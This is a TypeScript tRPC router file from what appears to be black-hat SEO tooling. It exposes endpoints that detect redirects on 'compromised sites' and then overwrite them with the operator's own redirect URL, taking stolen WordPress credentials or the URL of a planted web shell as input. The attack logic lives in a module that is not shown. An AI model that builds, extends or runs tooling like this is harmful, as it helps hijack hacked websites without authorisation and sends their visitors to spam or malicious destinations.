/**
 * tRPC Router: Redirect Takeover
 * Detect and overwrite competitor redirects on compromised sites
 */
import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import { detectExistingRedirects, executeRedirectTakeover } from "../redirect-takeover";

export const redirectTakeoverRouter = router({
  /** Analyze a target URL to detect existing redirects */
  detect: protectedProcedure
    .input(z.object({
      targetUrl: z.string().url(),
    }))
    .mutation(async ({ input }) => {
      const result = await detectExistingRedirects(input.targetUrl);
      return result;
    }),

  /** Execute redirect takeover on a target */
  execute: protectedProcedure
    .input(z.object({
      targetUrl: z.string().url(),
      ourRedirectUrl: z.string().url(),
      seoKeywords: z.array(z.string()).optional(),
      wpUsername: z.string().optional(),
      wpPassword: z.string().optional(),
      shellUrl: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const results = await executeRedirectTakeover({
        targetUrl: input.targetUrl,
        ourRedirectUrl: input.ourRedirectUrl,
        seoKeywords: input.seoKeywords,
        wpCredentials: input.wpUsername && input.wpPassword
          ? { username: input.wpUsername, password: input.wpPassword }
          : undefined,
        shellUrl: input.shellUrl,
      });
      return {
        results,
        anySuccess: results.some(r => r.success),
      };
    }),
});
